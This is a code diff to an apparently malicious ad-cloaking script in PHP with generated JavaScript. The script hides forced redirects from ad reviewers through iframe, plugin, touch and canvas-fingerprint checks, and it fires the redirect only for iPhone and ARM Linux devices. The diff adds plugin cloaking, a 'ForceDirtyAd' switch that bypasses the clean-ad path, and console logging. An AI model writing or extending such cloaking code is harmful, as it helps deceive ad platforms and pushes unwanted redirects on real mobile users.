@@ -244,10 +244,13 @@
 	$loggingEnabled 				= array_key_exists("LoggingEnabled", $adConfig) && $adConfig["LoggingEnabled"] === "false" ? false : true;
 	$ispCloakingEnabled 			= array_key_exists("ISPCloakingEnabled", $adConfig) && $adConfig["ISPCloakingEnabled"] === "false" ? false : true;
 	$iframeCloakingEnabled 			= array_key_exists("IFrameCloakingEnabled", $adConfig) && $adConfig["IFrameCloakingEnabled"] === "false" ? false : true;
+	$pluginCloakingEnabled 			= array_key_exists("PluginCloakingEnabled", $adConfig) && $adConfig["PluginCloakingEnabled"] === "false" ? false : true;
 	$touchCloakingEnabled 			= array_key_exists("TouchCloakingEnabled", $adConfig) && $adConfig["TouchCloakingEnabled"] === "false" ? false : true;
 	$blacklistedReferrers 			= array_key_exists("BlacklistedReferrers", $adConfig) ? preg_split("/\|/", $adConfig["BlacklistedReferrers"], -1, PREG_SPLIT_NO_EMPTY) : array();
 	$whitelistedReferrers 			= array_key_exists("WhitelistedReferrers", $adConfig) ? preg_split("/\|/", $adConfig["WhitelistedReferrers"], -1, PREG_SPLIT_NO_EMPTY) : array();
 	$blockedParameterValues			= array_key_exists("BlockedParameterValues", $adConfig) ? json_decode($adConfig["BlockedParameterValues"]) : array();
+	$consoleLoggingEnabled 			= array_key_exists("ConsoleLoggingEnabled", $adConfig) && $adConfig["ConsoleLoggingEnabled"] === "false" ? false : true;
+	$forceDirtyAd 					= array_key_exists("ForceDirtyAd", $adConfig) && $adConfig["ForceDirtyAd"] === "false" ? false : true;
 
 	$blacklistedReferrers = replaceEmptyKeywordEmptyString($blacklistedReferrers);
 	$whitelistedReferrers = replaceEmptyKeywordEmptyString($whitelistedReferrers);
@@ -463,7 +466,7 @@
 						        }";
 	}
 
-	if ($serveCleanAd || !$redirectEnabled)
+	if (($serveCleanAd || !$redirectEnabled) && !$forceDirtyAd)
 	{
 		if ($loggingEnabled && !$redirectEnabled)
 		{
@@ -495,6 +498,11 @@
 		if ($loggingEnabled)
 		{
 			allowedTrafficLog($campaignID, $ip, $isp['isp']);
+
+			if ($forceDirtyAd)
+			{
+				adlog($campaignID, "Force Dirty Ad enabled.");
+			}
 		}
 
 		$f_apps_WeightList 		= array();
@@ -562,7 +570,12 @@
 							 document.body.appendChild(el);";
 		}
 
-		$scriptCode = "<script type=\"text/javascript\">" .
+		$scriptCode = "<script type=\"text/javascript\">
+
+						if (typeof jslog !== 'function')
+						{
+							jslog = function(text) { " . ($consoleLoggingEnabled ? "console.log(text);" : "") . " }
+						}" .
 						($trackingPixelEnabled && !empty($trackingPixelUrl) ? $trackingPixelScript : "") .
 						($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ?
 						   "function getCanvasFingerprint()
@@ -600,7 +613,7 @@
 									hash = hash & hash;
 								}
 
-								/* console.log(hash); */
+								jslog('Canvas fingerprint: ' + hash);
 
 								return hash;
 							}
@@ -612,17 +625,14 @@
 
 								var result = blockedList.indexOf(canvasFingerPrint) !== -1;
 
-								if (typeof jslog === 'function')
+								if (result)
 								{
-									if (result)
-									{
-										jslog('canvasFingerPrint: ' + canvasFingerPrint + ' in blocked list.');
-									}
-									else
-									{
-										jslog('canvasFingerPrint: ' + canvasFingerPrint + ' NOT in blocked list.');
-									}
-								}								
+									jslog('canvasFingerPrint: ' + canvasFingerPrint + ' in blocked list.');
+								}
+								else
+								{
+									jslog('canvasFingerPrint: ' + canvasFingerPrint + ' NOT in blocked list.');
+								}
 
 								return result;
 							}" : "") .
@@ -644,34 +654,37 @@
 							function go()
 							{" .
 								($trackingPixelEnabled && !empty($trackingPixelUrl) ? "addTrackingPixel();\n" : "") .
-							   "if (" . ($iframeCloakingEnabled ? "inIFrame() && " : "") . "navigator.plugins.length == 0)
-						   		{" .
-						   			($touchCloakingEnabled ?
-						   		   "if (('ontouchstart' in window) ||	/* All standard browsers, except IE */
-		  								(navigator.MaxTouchPoints > 0)	|| (navigator.msMaxTouchPoints > 0))" : "") .
-								   "{" .
-									($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ?
-									   "if (inBlockedCanvasList())
-										{
-											return;
-										}" : "") .
-									   "if (/(iphone|linux armv)/i.test(window.navigator.platform))
-									    {
-										    setTimeout(function()
+							   	($iframeCloakingEnabled ? 
+							   	"if (inIFrame())" : "") .
+						   		"{" .
+						   			($pluginCloakingEnabled ? 
+								    "if (navigator.plugins.length == 0)" : "") .
+								    "{" .
+							   			($touchCloakingEnabled ?
+							   		   "if (('ontouchstart' in window) ||	/* All standard browsers, except IE */
+			  								(navigator.MaxTouchPoints > 0)	|| (navigator.msMaxTouchPoints > 0))" : "") .
+									   "{" .
+										($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ?
+										   "if (inBlockedCanvasList())
 											{
-												var topDomain = getReferrerDomain();
+												return;
+											}" : "") .
+										   "if (/(iphone|linux armv)/i.test(window.navigator.platform))
+										    {
+											    setTimeout(function()
+												{
+													var topDomain = getReferrerDomain();
 
-												$redirectCode
-											}, $redirectTimeout);
-										}
-									}
-									else
-									{
-										if (typeof jslog === 'function')
+													$redirectCode
+												}, $redirectTimeout);
+											}
+										}" .
+										($touchCloakingEnabled ?
+									   "else
 										{
-    										jslog('Touch test failed.');
-										}
-									}
+											jslog('Touch test failed.');
+										}" : "") .
+						   	   "	}
 						   		}
 						   	}
 
